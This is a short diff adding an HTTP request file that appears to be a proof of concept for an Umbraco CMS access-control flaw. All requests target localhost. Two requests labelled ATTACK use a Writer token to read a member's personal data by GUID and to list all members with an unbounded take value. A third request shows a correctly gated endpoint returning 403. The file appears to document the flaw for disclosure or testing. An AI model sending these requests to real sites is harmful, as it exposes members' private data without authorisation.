@@ -1,0 +1,13 @@
+# All requests sent as the default Writer (Content+Library only, NO Members section)
+
+# ATTACK — by-GUID member PII read (floor-only item endpoint):
+GET http://localhost:29184/umbraco/management/api/v1/item/member?id=25d15c4b-01d9-4d60-a143-98422d7df654 HTTP/1.1
+Authorization: Bearer <writer-token>
+
+# ATTACK — bulk membership enumeration (unclamped take):
+GET http://localhost:29184/umbraco/management/api/v1/item/member/search?query=Secret&take=100000 HTTP/1.1
+Authorization: Bearer <writer-token>
+
+# CONTRAST — same user, real Members-gated endpoint => 403:
+GET http://localhost:29184/umbraco/management/api/v1/member/25d15c4b-01d9-4d60-a143-98422d7df654 HTTP/1.1
+Authorization: Bearer <writer-token>
